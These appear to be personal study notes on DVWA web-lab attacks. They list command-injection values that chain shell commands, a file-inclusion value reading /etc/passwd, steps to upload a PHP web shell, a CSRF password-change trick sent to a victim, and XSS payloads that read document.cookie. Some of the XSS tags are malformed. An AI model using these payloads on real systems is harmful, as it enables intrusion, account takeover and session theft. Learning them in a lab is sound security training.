#### Command Injection
```bash
# List contents
1 ; ls or 1 | ls
1 ; pwd or 1 | pwd
&
; -> display both results
| -> display result of 2nd command
```

#### CSRF
```bash
Attacker can easily change the password of vicitm , of victim clicks on a linl

Copy the link after changing password -> copy, paste in  notepad and edit password.
shorten the url
and send it to victim.
once he execute that link password will change automatically
```

#### File inclusion
```bash
page_id=/etc/passwd
```

#### File upload
```bash
copy php petesterMonkey code and paste and create shell.php
upload this file and go to that path

paste after localhost or dvwa

Testing
intercept on -> send it to repeater
modify and check whether it is working or no

check content type - image/png
application/x-php
```
#### DOM XSS
```bash
select any language
at link -> replace language with "<script>alert("Hacked")<script>" or "<script>alert(document.cookie)<script>"
```
#### Reflected XSS
```bash
<script>alert(document.cookie)<script>
```
